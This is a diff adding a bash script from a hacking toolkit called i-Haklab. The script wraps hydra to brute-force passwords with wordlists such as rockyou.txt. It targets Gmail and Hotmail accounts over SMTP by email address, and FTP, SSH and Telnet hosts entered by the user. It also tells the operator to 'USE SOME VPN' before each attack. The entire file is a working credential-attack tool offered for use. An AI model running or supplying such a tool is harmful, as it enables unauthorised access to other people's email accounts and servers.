@@ -1,0 +1,77 @@
+#!/bin/bash
+#This file is part of i-Haklab command
+IFS=$'\n\t'
+trap ctrl_c 2
+source $HOME/.local/etc/i-Haklab/variables
+source $iHETC/functions
+chk-pkg hydra hydra
+chk-pkg git git
+ch-pkg wget wget
+
+alert(){ printf "\n\t       $R(_>)─> USE SOME VPN <─(<_)$W\n\t\t  press$G enter$W to start\n";read enter;}
+setTarget(){
+	printf "$Y(_>)_set_host_{\e[0mDNS or IP$Y}\n ╰─────➤$W";
+	read -ei "TIP: 8.8.8.8" -rp " " target;
+	[[ -z $target ]] && { printf >&2 "$R(_➤)$W Host not specified... Aborting\n";exit 0;}
+}
+setuserWL(){
+	printf "$Y(_>)_user_wordlist_{\e[0mempty=default$Y}\n ╰─────➤$W"
+	while read -ei "TIP: /sdcard/wordlist/usernames.txt" -rp " " usernames && [[ ! -e $usernames ]]
+	do
+		[[ -z $usernames ]] && {
+			printf >&2 "$Y(_➤)$W Set the fault file$Y\n ╰─────➤$W usernames.txt\n";
+					break;
+		}
+		printf "$R(_➤)$W file doesn't exists.$R\n ╰─────➤$W"
+	done
+	userWL=${usernames:-$WL/usernames.txt}
+}
+
+setWordlist(){
+	printf "$Y(_>)_password_wordlist_{\e[0mempty=default$Y}\n ╰─────➤ "
+	while read -ei "TIP: /sdcard/wordlist/rockyou.txt" -rp " " wordlist && [[ ! -e $wordlist ]]
+	do
+		[[ -z $wordlist ]] && {
+			printf >&2 "$Y(_➤)$W Set with the fault file$Y\n ╰─────➤$W rockyou.txt\n";
+		break;
+		}
+		printf "$R(_➤)$W file doesn't exists.$R\n ╰─────➤$W"
+	done
+	wordlist=${wordlist:-$WL/rockyou.txt}
+}
+
+#:::MAIN:::#
+banner
+if [[ $1 = mail ]];then
+	[[ $3 ]] && echo $3 > $PREFIX/tmp/bfmail || STDERR
+	MAIL=$(grep -oE '([hotgmailve]{4,7})' $PREFIX/tmp/bfmail|tail -n 1)
+	rm $PREFIX/tmp/bfmail
+	case $MAIL in
+		hotmail|live)
+			SMTP=smtp.live.com
+			;;
+		gmail)
+			SMTP=smtp.gmail.com
+			;;
+		*)
+			STDERR
+			;;
+	esac
+	setWordlist
+	alert;hydra -S -l $3 -P $wordlist -e ns -V -s 465 $SMTP smtp
+
+elif [[ $1 = ftp ]];then
+	setTarget;setuserWL;setWordlist
+	alert;hydra -I -L $userWL -P $wordlist $target ftp://$host
+
+elif [[ $1 = ssh ]];then
+	setTarget;setuserWL;setWordlist
+	alert;hydra -L $userWL -P $wordlist $target -t 4 ssh
+
+elif [[ $1 = telnet ]]; then
+	setTarget;setuserWL;setWordlist
+	alert;hydra $target telnet -L $userWL -P $wordlist -t 32 -s 23 -e ns -f -V
+
+else
+	STDERR
+fi
